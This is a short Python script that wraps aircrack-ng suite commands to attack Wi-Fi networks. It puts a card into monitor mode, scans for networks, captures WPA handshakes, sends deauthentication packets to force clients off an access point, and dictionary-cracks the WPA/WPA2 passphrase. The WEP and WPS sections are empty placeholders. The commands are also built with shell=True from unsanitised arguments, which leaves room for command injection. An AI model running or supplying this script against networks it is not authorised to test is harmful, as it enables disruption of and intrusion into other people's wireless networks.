import subprocess  # Module used to execute system commands

def monitor(wifi_cards):
    
    #Enable monitoring mode on the Wi-Fi card.
    
    subprocess.run(f"sudo airmon-ng start {wifi_cards}", shell=True)

def scan(wifi_cards):
    
    #Scan nearby networks.
    
    subprocess.run(f"sudo airodump-ng {wifi_cards}", shell=True)


# ------------------------------------------
# WPA/WPA2 protocol
# ------------------------------------------

def handshake(channel, macAddress, wirelessCard):
    
    #Capture WPA handshake packets.
    
    subprocess.run(f"sudo airodump-ng -c {channel} --bssid {macAddress} -w psk {wirelessCard}", shell=True)

def deathauth(numberDeauths, accessPoint, client, wirelessCard):
    
    #Send deauthentication packets.
    
    subprocess.run(f"sudo aireplay-ng -0 {numberDeauths} -a {accessPoint} -c {client} {wirelessCard}", shell=True)

def crack(dictionary, macAddress):
    
    #Crack WPA/WPA2 passphrase.
    
    subprocess.run(f"sudo aircrack-ng -w {dictionary} -b {macAddress} psk*.cap", shell=True)

# ------------------------------------------
# WEP protocol
# ------------------------------------------














# ------------------------------------------
# WPS protocole
# ------------------------------------------
